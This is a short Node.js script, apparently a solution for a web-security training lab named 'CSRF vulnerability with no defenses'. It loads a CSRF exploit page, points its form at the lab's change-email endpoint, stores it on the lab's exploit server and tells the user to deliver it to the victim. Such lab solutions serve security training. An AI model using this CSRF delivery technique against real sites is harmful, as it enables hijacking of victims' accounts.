import { parse } from "node-html-parser";
import { ExploitServer } from "../../../utils/exploitServer.js";
import { getFileContent } from "../../../utils/getFileContent.js";
import { getParsedInput } from "../../../utils/getParsedInput.js";

const { url, httpClient } = getParsedInput({
  description: "Lab: CSRF vulnerability with no defenses",
  proxy: true,
});

let exploit = await getFileContent("./csrf.html");
const changeEmailUrl = url + "my-account/change-email";
exploit = replaceActionAttribute(exploit, changeEmailUrl);

const exploitServer = await ExploitServer.create(url, httpClient);
exploitServer.storeExploit(exploit);

console.log(`To solve the lab:
  1. Visit ${exploitServer.url}
  2. Press "Deliver exploit to victim" button`);

function replaceActionAttribute(html, url) {
  const parsedHtml = parse(html);
  parsedHtml.querySelector("form").setAttribute("action", url);

  return parsedHtml.toString();
}
